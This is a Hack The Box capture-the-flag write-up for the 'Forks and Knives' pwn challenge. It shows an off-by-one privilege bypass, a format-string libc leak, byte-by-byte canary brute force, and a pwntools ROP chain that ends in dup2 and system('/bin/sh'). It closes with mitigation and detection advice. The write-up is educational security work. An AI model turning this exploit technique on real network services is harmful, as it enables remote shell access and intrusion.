---
challenge: Forks and Knives
category: Challenge
type: pwn
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [pwn, format-string, canary, rop, libc, fork]
---

# Forks and Knives — Hack The Box (Challenge)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology note; no real flags or credentials.

## TL;DR

A server that `fork()`s per connection with three chained bugs: an off-by-one that zeroes the manager flag, a four-byte format string leaking a libc address and a canary-protected overflow. Because the child inherits the parent's canary and libc base, the canary is brute-forced byte by byte and the final ROP calls `system("/bin/sh")` after redirecting stdio to the socket.

## Prompt and surface

- **Pwn** category, **Medium** difficulty.
- Ships `Dockerfile`, `build-docker.sh`, `challenge/server` and `challenge/libc.so.6`.
- The flag lives in `/home/ctf/flag*.txt` and the service listens on 1337.

```bash
file challenge/server
checksec --file=challenge/server
```

```text
ELF 64-bit LSB pie executable, x86-64
Full RELRO · Canary found · NX enabled · PIE enabled
GLIBC 2.35
```

## Recon

```bash
./challenge/server
nc <IP> 1337
```

The menu offers reserve, view and clear; options 5 and 6 are manager-only.

## Code analysis

The disassembly shows three things:

- `read(fd, name_buf, 16)` followed by `name_buf[n] = '\0'`: with 16 bytes the terminator lands on `not_manager`.
- The reservation is built with `snprintf(buf, ..., "Table for %s", input)` and then passed to `fprintf(file, buf)`: the user's `%` is interpreted.
- The answer read uses `read(fd, buf + n, 0x100)` over a `0x100` buffer, allowing writes from `rbp-0x10`.

## Why it fails

```text
BSS:   name_buf[16] @0x4030 | not_manager @0x4040
Stack: order_buf[256] @rbp-0x110 | gap 8 | canary @rbp-0x08 | rbp | ret
```

1. **Manager:** exactly 16 bytes with no newline → `not_manager = 0` → options 5 and 6 unlock.
2. **Leak:** the format string is capped at 4 bytes, so positional specifiers are required; `%2$p` returns an `lseek64` value and `libc_base = leak - 0x8c91b`.
3. **Canary:** the binary is not re-executed, so the canary is constant across connections; test byte by byte (the first is `\x00`) until the child survives.
4. **ROP:** `b'X'*8 + canary + b'Y'*8 + chain`, with `dup2(4,0..2)` and `system("/bin/sh")`.

## Local reproduction

```bash
docker build -t forks .
docker run --rm -p 1337:1337 forks
python3 -c "from pwn import *; print(cyclic(300))"
```

With `gdb` and `gef`, `pattern search` on `$rsp` confirms the offset; `vmmap` gives the libc base to validate the leak calculation.

## Exploitation

```python
from pwn import *
context.binary = elf = ELF('challenge/server')
libc = ELF('challenge/libc.so.6')

io = remote('<IP>', 1337)
io.send(b'A'*16)                  # not_manager = 0
# reserve with %2$p, read it back, compute libc_base
# brute-force the canary byte by byte
rop  = p64(libc_base + 0x2a3e5)   # pop rdi; ret
rop += p64(4)
rop += p64(libc_base + 0x2be51)   # pop rsi; ret
rop += p64(0)
rop += p64(libc_base + 0x2be53)   # pop rdx; ... (check build)
rop += p64(libc_base + 0x45eb0)   # pop rax; ret
rop += p64(33)                    # dup2
rop += p64(libc_base + 0x91316)   # syscall; ret
# repeat for 1 and 2, then system("/bin/sh")
```

Reference offsets for this build: `pop rdi` `0x2a3e5`, `pop rsi` `0x2be51`, `syscall` `0x91316`, `/bin/sh` `0x1d8678`. They change with another libc; recompute with `ROPgadget` or `ropper`.

## Evidence

- `checksec` with all five protections.
- Page-aligned leak (`...000`).
- Recovered canary and `cat /home/ctf/flag*` with output redacted.

## Lessons learned

- `fork()` without `exec()` preserves canary and ASLR: brute force is viable and worth using.
- A one-byte off-by-one can unlock the whole application.
- A four-byte format string forces positionals; no room for `%n` or long text.
- `dup2` to the client descriptor is essential: the child does not inherit the socket's stdout.
- Verify libc offsets against the shipped file, never from memory.

## Mitigations and detection

- Read with `read(fd, buf, sizeof(buf)-1)` and terminate explicitly; never write the NUL out of range.
- Pass input as an argument (`"%s"`) to `fprintf`, never as the format.
- Rebuild with `-D_FORTIFY_SOURCE=2` and use `snprintf` with correct sizes.
- Detection: processes dying on `__stack_chk_fail`, strings with repeated `%p` and connections surviving canary failures.
- References: CWE-193 (off-by-one), CWE-134 (format string), MITRE T1190.

## References

- <https://www.hackthebox.com/challenges/forks-and-knives>
- <https://blog.beatman.tw/en/articles/69ed65acc3a1bf5c78cef870>
- <https://mateimartin.github.io/blog/forks_and_knives>
- <https://github.com/Tejaswivallapu/forks-and-knives>
